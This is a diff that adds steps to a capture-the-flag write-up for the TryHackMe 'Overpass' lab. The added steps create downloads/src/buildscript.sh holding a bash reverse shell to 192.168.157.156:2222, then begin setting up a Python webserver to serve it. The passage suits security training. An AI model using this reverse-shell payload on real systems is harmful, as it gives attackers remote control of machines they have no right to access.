@@ -692,7 +692,27 @@ Obtain a revershell payload from revshells.com. Enter the attacker IP, port numb
 
 Open a new terminal and create the directory path `./downloads/src/` and the a file called `builtscript.sh` and paste the reverse shell payload.
 
+```shell
+┌──(kali㉿kali)-[~/CS/THM/Overpass]
+└─$ mkdir -p downloads/src                                       
+ 
+┌──(kali㉿kali)-[~/CS/THM/Overpass]
+└─$ cd downloads/src                                             
 
+┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
+└─$ vi buildscript.sh
+
+┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
+└─$ vi buildscript.sh
+
+┌──(kali㉿kali)-[~/…/THM/Overpass/downloads/src]
+└─$ cat buildscript.sh                                           
+/bin/bash -i >& /dev/tcp/192.168.157.156/2222 0>&1
+```
+
+Start a python **webserver** on **port 80** on the attacker machine.
+
+Command: 
 
 
 ```shell
